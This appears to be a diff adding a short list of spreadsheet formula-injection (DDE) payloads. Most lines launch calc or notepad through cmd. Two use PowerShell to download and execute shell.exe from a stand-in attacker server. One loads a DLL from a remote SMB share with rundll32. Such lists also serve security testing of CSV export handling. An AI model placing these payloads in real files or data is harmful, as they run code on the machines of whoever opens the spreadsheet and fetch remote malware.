@@ -1,0 +1,7 @@
+DDE ("cmd";"/C calc";"!A0")A0
+=cmd|'/C powershell IEX(wget attacker-server/shell.exe)'!A0
+=20+40+cmd|' /C calc'!A0
+=cmd|' /C notepad'!'A1'
+@SUM(8+1)*cmd|' /C calc'!A0
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+=cmd|'/c rundll32.exe \\10.0.0.2\malicious\1.dll,0'!_xlbgnm.A1
